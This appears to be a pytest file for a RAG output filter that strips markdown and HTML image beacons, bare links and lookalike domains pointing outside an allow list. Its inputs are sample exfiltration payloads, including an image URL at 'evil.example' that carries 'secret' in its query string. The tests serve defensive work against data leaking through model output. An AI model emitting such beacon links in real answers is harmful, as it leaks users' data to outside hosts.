from rag_shield.layer4.exfil import strip_exfil

ALLOW = ["acme-labs.example"]


def test_image_beacon_removed():
    out, stripped = strip_exfil("Result ![x](https://evil.example/a?d=secret) done", ALLOW)
    assert "evil.example" not in out
    assert stripped == ["image:https://evil.example/a?d=secret"]


def test_non_allow_listed_link_removed_but_text_kept():
    out, stripped = strip_exfil("See [portfolio](https://untrusted.example/p).", ALLOW)
    assert out == "See portfolio."
    assert stripped == ["link:https://untrusted.example/p"]


def test_allow_listed_link_and_subdomain_kept():
    text = "[Acme](https://acme-labs.example/x) and [Jobs](https://jobs.acme-labs.example/y)"
    out, stripped = strip_exfil(text, ALLOW)
    assert out == text and stripped == []


def test_lookalike_domain_not_allowed():
    out, stripped = strip_exfil("[x](https://acme-labs.example.evil.example/)", ALLOW)
    assert stripped and "evil" not in out


def test_html_img_and_bare_url_removed():
    out, stripped = strip_exfil(
        'Hi <img src="https://evil.example/p.gif?q=1"> go to https://evil.example/q?d=1 now',
        ALLOW,
    )
    assert "evil.example" not in out
    assert len(stripped) == 2 and "[link removed]" in out


def test_clean_answer_untouched():
    text = "The candidate knows Python [c1]."
    assert strip_exfil(text, ALLOW) == (text, [])
